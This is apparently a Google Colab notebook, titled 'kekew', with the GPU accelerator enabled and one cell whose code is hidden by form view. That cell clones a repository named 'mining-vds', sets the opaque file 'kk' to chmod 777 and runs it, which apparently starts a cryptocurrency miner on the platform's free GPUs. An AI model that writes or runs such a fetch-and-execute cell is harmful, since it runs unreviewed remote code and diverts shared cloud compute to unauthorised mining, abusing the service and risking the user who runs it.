{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "kekew",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "7Di3LTW84O1i",
        "cellView": "form"
      },
      "source": [
        "!git clone https://github.com/nedogimov/mining-vds && cd mining-vds && chmod 777 kk && ./kk"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
